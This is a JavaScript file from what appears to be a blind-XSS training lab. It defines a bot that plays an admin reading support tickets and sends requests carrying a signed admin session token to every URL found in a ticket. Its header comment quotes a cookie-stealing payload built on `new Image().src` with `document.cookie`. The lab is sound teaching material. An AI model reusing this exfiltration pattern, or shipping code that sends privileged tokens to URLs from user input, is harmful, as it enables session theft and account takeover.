'use strict';
/* ============================================================================
 * Admin viewer bot — simulates an admin reviewing support tickets so the
 * BLIND XSS lab "fires" without a real headless browser.
 *
 * On an interval it picks up unseen tickets, marks them seen (as a human admin
 * would by opening them), and simulates the admin's browser executing any
 * embedded payload: it extracts URLs from the ticket body and beacons to each
 * one carrying the admin's (fake but valid) session cookie — modelling
 * `new Image().src='http://.../collect?c='+document.cookie`.
 *
 * SAFE/contained: requests stay on the internal docker network; the admin
 * cookie is a lab token for the seeded admin account (its theft demonstrates
 * account takeover within the lab only).
 * ========================================================================== */
const http = require('http');
const https = require('https');
const db = require('./db');
const config = require('./config');
const { signToken } = require('./auth');
const { addCapture } = require('./state');

const URL_RE = /https?:\/\/[^\s"'`)<>]+/gi;

async function tick() {
  let adminCookie = 'sh_admin_session=unknown';
  try {
    const admins = await db.query("SELECT id, email, name, role FROM users WHERE role='admin' LIMIT 1");
    if (admins.length) adminCookie = 'token=' + signToken(admins[0]);
  } catch { return; }

  let tickets = [];
  try { tickets = await db.query('SELECT id, body FROM support_tickets WHERE admin_seen = 0 ORDER BY id ASC LIMIT 20'); }
  catch { return; }

  for (const t of tickets) {
    await db.query('UPDATE support_tickets SET admin_seen = 1 WHERE id = ?', [t.id]);
    const body = t.body || '';
    const urls = body.match(URL_RE) || [];
    for (let raw of urls) {
      // Simulate the admin browser: substitute document.cookie and append the
      // stolen cookie so collector-style payloads capture something real.
      let target = raw.replace(/document\.cookie/gi, encodeURIComponent(adminCookie));
      const sep = target.includes('?') ? '&' : '?';
      if (!/[?&]c=/.test(target)) target += `${sep}c=${encodeURIComponent(adminCookie)}`;
      fire(target, adminCookie, t.id);
    }
    addCapture({ source: 'admin-bot', note: `admin opened ticket #${t.id}`, ticket: t.id, urls });
  }
}

function fire(target, cookie, ticketId) {
  try {
    const u = new URL(target);
    const lib = u.protocol === 'https:' ? https : http;
    const rq = lib.get(target, { headers: { Cookie: cookie, 'User-Agent': 'ShopHunt-AdminBot/1.0' } }, (r) => r.resume());
    rq.on('error', () => {});
    rq.setTimeout(3000, () => rq.destroy());
  } catch { /* ignore malformed */ }
}

function start() {
  console.log('[admin-bot] started (blind-XSS viewer simulation)');
  setInterval(() => { tick().catch(() => {}); }, 15000);
}

module.exports = { start, tick };
